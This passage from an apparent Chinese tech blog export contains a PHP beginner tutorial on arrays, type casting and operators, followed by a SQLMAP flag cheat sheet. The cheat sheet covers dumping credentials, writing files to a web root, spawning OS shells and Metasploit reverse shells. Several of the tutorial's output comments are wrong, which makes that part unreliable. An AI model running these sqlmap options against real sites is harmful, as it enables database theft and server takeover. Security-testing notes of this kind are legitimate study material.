class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>); <span class="comment">//	Array ( [0] =&gt; a [name] =&gt; b [1] =&gt; c [sex] =&gt; d) </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">------------------------------</span><br><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);	<span class="comment">//Array ( [1] =&gt; c [2] =&gt; d) </span></span><br></pre></td></tr></table></figure>



<p>数组的下标只能是正整数和字符串</p>
<p>思考如下下标</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stu</span>[<span class="literal">true</span>]=<span class="string">&#x27;tom&#x27;</span>;		<span class="comment">//转成1</span></span><br><span class="line"><span class="variable">$stu</span>[<span class="literal">false</span>]=<span class="string">&#x27;berry&#x27;</span>;	<span class="comment">//转成0</span></span><br><span class="line"><span class="variable">$stu</span>[<span class="number">12.9</span>]=<span class="string">&#x27;aa&#x27;</span>;		<span class="comment">//转成12（取整数部分）</span></span><br><span class="line"><span class="variable">$stu</span>[-<span class="number">10</span>]=<span class="string">&#x27;bb&#x27;</span>;			<span class="comment">//负数可以做下标</span></span><br><span class="line"><span class="variable">$stu</span>[-<span class="number">12.3</span>]=<span class="string">&#x27;cc&#x27;</span>;		<span class="comment">//取负整数-12</span></span><br><span class="line"><span class="variable">$stu</span>[<span class="string">&#x27;10&#x27;</span>]=<span class="string">&#x27;dd&#x27;</span>;		<span class="comment">//字符串数字转成数字</span></span><br><span class="line"><span class="variable">$stu</span>[<span class="string">&#x27;&#x27;</span>]=<span class="string">&#x27;ee&#x27;</span>;			<span class="comment">//空字符串也可以做下标</span></span><br><span class="line"><span class="variable">$stu</span>[<span class="literal">null</span>]=<span class="string">&#x27;ff&#x27;</span>;		<span class="comment">//转成空字符串做下标</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$stu</span>);</span><br></pre></td></tr></table></figure>

<hr>
<p>短数组语法，可以直接通过中括号声明数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stu</span>=[<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;berry&#x27;</span>,<span class="string">&#x27;ketty&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$stu</span>);  <span class="comment">//Array ( [0] =&gt; tom [1] =&gt; berry [2] =&gt; ketty ) </span></span><br></pre></td></tr></table></figure>



<p>多学一招：在PHP7.1中可以支持数组的赋值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例题，两个数交换</span></span><br><span class="line"><span class="variable">$num1</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$num2</span>=<span class="number">20</span>;</span><br><span class="line">[<span class="variable">$num1</span>,<span class="variable">$num2</span>]=[<span class="variable">$num2</span>,<span class="variable">$num1</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num1</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>,<span class="variable">$num2</span>;</span><br></pre></td></tr></table></figure>



<p>二维数组的声明</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stu</span>=[</span><br><span class="line">	[<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">22</span>],</span><br><span class="line">	[<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;berry&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>=&gt;<span class="string">&#x27;女&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">23</span>]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$stu</span>);</span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; tom</span><br><span class="line">            [sex] =&gt; 男</span><br><span class="line">            [age] =&gt; <span class="number">22</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; berry</span><br><span class="line">            [sex] =&gt; 女</span><br><span class="line">            [age] =&gt; <span class="number">23</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>多学一招：字符串可以通过数组的方式去调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;abc&#x27;</span>[<span class="number">2</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//a  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;abc&#x27;</span>[-<span class="number">2</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//c，从右边开始取第一个  7.1开始支持</span></span><br></pre></td></tr></table></figure>



<p>小结：</p>
<p>1、数组在内存中一段连续的空间</p>
<p>2、如果要保存同一类型的多个数据就使用数组</p>
<p><strong>2、对象</strong></p>
<p>对象在后面专门讲解（面向对象编程）</p>
<h4 id="1-3-3-特殊类型"><a href="#1-3-3-特殊类型" class="headerlink" title="1.3.3  特殊类型"></a>1.3.3  特殊类型</h4><p>1、资源</p>
<p>2、null</p>
<p>提醒：在PHP中 null和NULL是一样的，不区分大小写</p>
<h4 id="1-3-4-类型转换"><a href="#1-3-4-类型转换" class="headerlink" title="1.3.4 类型转换"></a>1.3.4 类型转换</h4><p>1、自动类型转换：当提供的类型和需要的类型不一致的时候会自动进行类型转换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>)&#123;   <span class="comment">//true</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;aa&#x27;</span>;	<span class="comment">//aa</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;bb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">---------------------------------</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;20&#x27;</span>-<span class="number">10</span>;	<span class="comment">//10</span></span><br></pre></td></tr></table></figure>



<p>2、强制类型转换</p>
<p>语法：（数据类型）数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num1</span>=<span class="string">&#x27;12&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num1</span>,(<span class="keyword">int</span>)<span class="variable">$num1</span>,(<span class="keyword">float</span>)<span class="variable">$num1</span>);   <span class="comment">//string(2) &quot;12&quot; int(12) float(12) </span></span><br></pre></td></tr></table></figure>

<p>其他类型和布尔之间的转换</p>
<p>规则：0、空为假，非0非空为真</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="string">&#x27;abc&#x27;</span>);	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="string">&#x27;&#x27;</span>);		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="string">&#x27;0&#x27;</span>);	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="string">&#x27;0.0&#x27;</span>);	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="string">&#x27;00&#x27;</span>);	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="string">&#x27;false&#x27;</span>);	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="string">&#x27;null&#x27;</span>);	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="number">1</span>);		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="number">0</span>);		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)-<span class="number">10</span>);		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="number">0.0</span>);		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="keyword">array</span>());	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="keyword">array</span>(<span class="number">1</span>));	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="keyword">array</span>(<span class="literal">false</span>));	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;<span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="keyword">bool</span>)<span class="literal">null</span>);	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//</span></span><br></pre></td></tr></table></figure>



<h2 id="1-4-运算符"><a href="#1-4-运算符" class="headerlink" title="1.4  运算符"></a>1.4  运算符</h2><h4 id="1-4-1-算术运算符"><a href="#1-4-1-算术运算符" class="headerlink" title="1.4.1  算术运算符"></a>1.4.1  算术运算符</h4><table>
<thead>
<tr>
<th>一元运算符</th>
<th>二元运算符</th>
</tr>
</thead>
<tbody><tr>
<td>++</td>
<td>+</td>
</tr>
<tr>
<td>–</td>
<td>-</td>
</tr>
<tr>
<td></td>
<td>*</td>
</tr>
<tr>
<td></td>
<td>&#x2F;</td>
</tr>
<tr>
<td></td>
<td>%   (取模)</td>
</tr>
</tbody></table>
<p>注意：在PHP中，算术运算符只能做数学运算。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;10&#x27;</span>+<span class="string">&#x27;20&#x27;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;		<span class="comment">//30</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;10ab&#x27;</span>+<span class="string">&#x27;20cd&#x27;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//30 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ab10&#x27;</span>+<span class="string">&#x27;cd20&#x27;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;	<span class="comment">//0</span></span><br></pre></td></tr></table></figure>

<p>++前置：先自增再运算返回</p>
<p>++后置：先运算返回再自增</p>
<p>练习</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$num</span>++;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;	<span class="comment">//10</span></span><br><span class="line">-------------------------</span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>++;   <span class="comment">//10</span></span><br><span class="line">------------------------</span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$num</span>;   <span class="comment">//11</span></span><br></pre></td></tr></table></figure>

<p>练习</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">echo</span> (++<span class="variable">$num</span>)+(++<span class="variable">$num</span>)+(++<span class="variable">$num</span>);	<span class="comment">//21</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$num2</span>=<span class="number">10</span></span><br><span class="line"><span class="keyword">echo</span> (++<span class="variable">$num2</span>)+(++<span class="variable">$num2</span>)+(<span class="variable">$num2</span>++);	<span class="comment">//36(35)  35	35</span></span><br><span class="line">          </span><br><span class="line">-------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$num</span>++)+(<span class="variable">$num</span>++)+(<span class="variable">$num</span>++);	<span class="comment">//18</span></span><br></pre></td></tr></table></figure>





<h4 id="1-4-2-关系运算符（比较运算符）"><a href="#1-4-2-关系运算符（比较运算符）" class="headerlink" title="1.4.2  关系运算符（比较运算符）"></a>1.4.2  关系运算符（比较运算符）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;		</span><br><span class="line">&gt;=		</span><br><span class="line">&lt;</span><br><span class="line">&lt;=</span><br><span class="line">==	 		</span><br><span class="line">!=</span><br><span class="line">===	</span><br><span class="line">!==</span><br></pre></td></tr></table></figure>

<p>比较运算符的运算结果是布尔值</p>
<h4 id="1-4-3-逻辑运算符"><a href="#1-4-3-逻辑运算符" class="headerlink" title="1.4.3  逻辑运算符"></a>1.4.3  逻辑运算符</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;	与：运算符两边的表达式都要计算</span><br><span class="line">|	或：运算符两边的表达式都要计算</span><br><span class="line"></span><br><span class="line">&amp;&amp;	短路与：如果前面的条件不满足，后面的条件就不用计算了</span><br><span class="line">||	短路或</span><br><span class="line">!	非</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>&gt;<span class="number">10</span> &amp;&amp; ++<span class="variable">$a</span>&gt;<span class="number">20</span>)</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;你好吗&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;		<span class="comment">//5</span></span><br><span class="line"><span class="comment">//分析：前面的条件不满足，后面的条件就不计算了</span></span><br><span class="line">----------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>&lt;<span class="number">10</span> || ++<span class="variable">$a</span>&gt;<span class="number">20</span>)</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;你好吗&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;		<span class="comment">//5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分析：前面的条件满足，后面的条件就不计算了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span>(++<span class="variable">$b</span>&gt;<span class="number">20</span>||<span class="variable">$b</span>++&lt;<span class="number">20</span> )</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;你好吗&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;		<span class="comment">//12</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="1-4-4-赋值运算符"><a href="#1-4-4-赋值运算符" class="headerlink" title="1.4.4  赋值运算符"></a>1.4.4  赋值运算符</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">=			<span class="comment">//赋值</span></span><br><span class="line">+=			<span class="comment">//a+=b   a=a+b</span></span><br><span class="line">-=			<span class="comment">//a-=b	a=a-b</span></span><br><span class="line">*=			<span class="comment">//a*=b	a=a*b</span></span><br><span class="line">/=			<span class="comment">//a/=b	a=a/b</span></span><br><span class="line">%=			<span class="comment">//a%=b	a=a%b</span></span><br></pre></td></tr></table></figure>



<h4 id="1-4-5-字符串连接符"><a href="#1-4-5-字符串连接符" class="headerlink" title="1.4.5  字符串连接符(.)"></a>1.4.5  字符串连接符(.)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;aa&#x27;</span>.<span class="string">&#x27;bb&#x27;</span>;		<span class="comment">//字符串链接	aabb</span></span><br></pre></td></tr></table></figure>



<h4 id="1-4-6-错误抑制符"><a href="#1-4-6-错误抑制符" class="headerlink" title="1.4.6  错误抑制符(@)"></a>1.4.6  错误抑制符(@)</h4><p>错误抑制符只对表达式有效</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> @(<span class="variable">$aa</span>+<span class="variable">$bb</span>);	<span class="comment">//错误抑制</span></span><br></pre></td></tr></table></figure>



<h4 id="1-4-7-三元运算符"><a href="#1-4-7-三元运算符" class="headerlink" title="1.4.7  三元运算符(?:)"></a>1.4.7  三元运算符(?:)</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">表达式?值1：值2</span><br><span class="line">//表达式的值为true，返回值1，否则返回值2</span><br></pre></td></tr></table></figure>

<p>练习</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">11</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>%<span class="number">2</span>?<span class="string">&#x27;奇数&#x27;</span>:<span class="string">&#x27;偶数&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="1-4-8-null合并运算符"><a href="#1-4-8-null合并运算符" class="headerlink" title="1.4.8  null合并运算符(??)"></a>1.4.8  null合并运算符(??)</h4><p>PHP7.0以后才支持</p>
<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>??<span class="string">&#x27;姓名不详&#x27;</span>;		<span class="comment">//姓名不详</span></span><br></pre></td></tr></table></figure>



<p>多学一招：两个用来判断的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset()：判断变量是否被设置，并且设置的不是null</span><br><span class="line">empty()：检查一个变量是否为空，能转成false全部是空--&gt;0或空  ，[&#x27;&#x27;,0,0.0,array(),null]</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="variable">$name</span>)?<span class="variable">$name</span>:<span class="string">&#x27;姓名不详&#x27;</span>;		<span class="comment">//姓名不详</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stu</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">empty</span>(<span class="variable">$stu</span>)?<span class="string">&#x27;空&#x27;</span>:<span class="string">&#x27;非空&#x27;</span>;		<span class="comment">//空</span></span><br></pre></td></tr></table></figure>



<h2 id="1-5-判断"><a href="#1-5-判断" class="headerlink" title="1.5  判断"></a>1.5  判断</h2><h4 id="1-5-1-语法"><a href="#1-5-1-语法" class="headerlink" title="1.5.1  语法"></a>1.5.1  语法</h4><p>单分支</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双分支</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件)&#123;</span><br><span class="line">    <span class="comment">//代码块1</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//代码块2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多分支</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件)&#123;</span><br><span class="line">    <span class="comment">//代码块1</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>(条件<span class="number">2</span>)&#123;    <span class="comment">//注意：elseif之间没有空格</span></span><br><span class="line">     <span class="comment">//代码块2</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="comment">//代码块3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多路选择</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line">        <span class="keyword">case</span> 常量：</span><br><span class="line">            <span class="comment">//代码块</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> 常量：</span><br><span class="line">            <span class="comment">//代码块</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">   		<span class="keyword">default</span>:</span><br><span class="line">        	<span class="comment">//代码块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1-5-2-例题"><a href="#1-5-2-例题" class="headerlink" title="1.5.2  例题"></a>1.5.2  例题</h4><p><strong>例题一、判断闰年（练习双分支）</strong></p>
<p>步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、前端：创建表单</span><br><span class="line">2、前端：提交数据</span><br><span class="line">3、后端：在服务器获取提交的数据，并判断  （用户输入的一个值只能为满足条件的数字。否则提示用户相应的错误）</span><br><span class="line"></span><br><span class="line">前后端写在同一个文件里面.php结尾</span><br><span class="line">$_POST/$_GET</span><br><span class="line">is_numeric</span><br><span class="line">empty </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">普通闰年：公历年份是4的倍数，且不是100的倍数的，为闰年</span><br></pre></td></tr></table></figure>



<hr>
]]></content>
  </entry>
  <entry>
    <title>SQLMAP使用参数</title>
    <url>/2023/04/13/sqlmap%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<h1 id="SQLMAP使用参数："><a href="#SQLMAP使用参数：" class="headerlink" title="SQLMAP使用参数："></a>SQLMAP使用参数：</h1><p>基本操作笔记：</p>
<p>-u  #注入点 </p>
<p>-f  #指纹判别数据库类型 </p>
<p>-b  #获取数据库版本信息 </p>
<p>-p  #指定可测试的参数(?page&#x3D;1&amp;id&#x3D;2 -p “page,id”) </p>
<p>-D “”  #指定数据库名 </p>
<p>-T “”  #指定表名 </p>
<p>-C “”  #指定字段 </p>
<p>-s “”  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) </p>
<p>–level&#x3D;(1-5) #要执行的测试水平等级，默认为1 </p>
<p>–risk&#x3D;(0-3)  #测试执行的风险等级，默认为1 </p>
<p>–time-sec&#x3D;(2,5) #延迟响应，默认为5 </p>
<p>–data #通过POST发送数据 </p>
<p>–columns        #列出字段 </p>
<p>–current-user   #获取当前用户名称 </p>
<p>–current-db     #获取当前数据库名称 </p>
<p>–users          #列数据库所有用户 </p>
<p>–passwords      #数据库用户所有密码 </p>
<p>–privileges     #查看用户权限(–privileges -U root) </p>
<p>-U               #指定数据库用户 </p>
<p>–dbs            #列出所有数据库 </p>
<p>–tables -D “”   #列出指定数据库中的表 </p>
<p>–columns -T “user” -D “mysql”      #列出mysql数据库中的user表的所有字段 </p>
<p>–dump-all            #列出所有数据库所有表 </p>
<p>–exclude-sysdbs      #只列出用户自己新建的数据库和表 </p>
<p>–dump -T “” -D “” -C “”   #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) </p>
<p>–dump -T “” -D “” –start 2 –top 4  # 列出指定数据库的表的2-4字段的数据 </p>
<p>–dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </p>
<p>–os      #指定系统(Linux,Windows) </p>
<p>-v  #详细的等级(0-6) </p>
<p>​    0：只显示Python的回溯，错误和关键消息。 </p>
<p>​    1：显示信息和警告消息。 </p>
<p>​    2：显示调试消息。 </p>
<p>​    3：有效载荷注入。 </p>
<p>​    4：显示HTTP请求。 </p>
<p>​    5：显示HTTP响应头。 </p>
<p>​    6：显示HTTP响应页面的内容 </p>
<p>–privileges  #查看权限 </p>
<p>–is-dba      #是否是数据库管理员 </p>
<p>–roles       #枚举数据库用户角色 </p>
<p>–udf-inject  #导入用户自定义函数（获取系统权限） </p>
<p>–union-check  #是否支持union 注入 </p>
<p>–union-cols #union 查询表记录 </p>
<p>–union-test #union 语句测试 </p>
<p>–union-use  #采用union 注入 </p>
<p>–union-tech orderby #union配合order by </p>
<p>–data “” #POST方式提交数据(–data “page&#x3D;1&amp;id&#x3D;2”) </p>
<p>–cookie “用;号分开”      #cookie注入(–cookies&#x3D;”PHPSESSID&#x3D;mvijocbglq6pi463rlgk1e4v52; security&#x3D;low”) </p>
<p>–referer “”     #使用referer欺骗(–referer “<a href="http://www.baidu.com/">http://www.baidu.com</a>“) </p>
<p>–user-agent “”  #自定义user-agent </p>
<p>–proxy “<a href="http://127.0.0.1:8118/">http://127.0.0.1:8118</a>“ #代理注入 </p>
<p>–string&#x3D;””    #指定关键词,字符串匹配. </p>
<p>–threads 　　  #采用多线程(–threads 3) </p>
<p>–sql-shell    #执行指定sql命令 </p>
<p>–sql-query    #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user &#x3D; ‘root’ LIMIT 0, 1” ) </p>
<p>–file-read    #读取指定文件 </p>
<p>–file-write   #写入本地文件(–file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt;将本地的test.txt文件写入到目标的1.txt) </p>
<p>–file-dest    #要写入的文件绝对路径 </p>
<p>–os-cmd&#x3D;id    #执行系统命令 </p>
<p>–os-shell     #系统交互shell </p>
<p>–os-pwn       #反弹shell(–os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;) </p>
<p>–msf-path&#x3D;    #matesploit绝对路径(–msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;) </p>
<p>–os-smbrelay  # </p>
<p>–os-bof       # </p>
<p>–reg-read     #读取win系统注册表 </p>
<p>–priv-esc     # </p>
<p>–time-sec&#x3D;    #延迟设置 默认–time-sec&#x3D;5 为5秒 </p>
<p>-p “user-agent” –user-agent “sqlmap&#x2F;0.7rc1 (<a href="http://sqlmap.sourceforge.net/">http://sqlmap.sourceforge.net</a>)”  #指定user-agent注入 </p>
<p>–eta          #盲注 </p>
<p>&#x2F;pentest&#x2F;database&#x2F;sqlmap&#x2F;txt&#x2F;</p>
<p>common-columns.txt　　字段字典　　　 </p>
<p>common-outputs.txt </p>
<p>common-tables.txt      表字典 </p>
<p>keywords.txt </p>
<p>oracle-default-passwords.txt </p>
<p>user-agents.txt </p>
<p>wordlist.txt </p>
<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><p>判断网址有无SQL注入漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;⽹址&quot;</span><br></pre></td></tr></table></figure>



<p>结束以后会得到该⽹站的数据库、操作系统、服务器等版本信息</p>
<p>如果存在漏洞可以使用以下命令注出当前网站下所有数据库名</p>
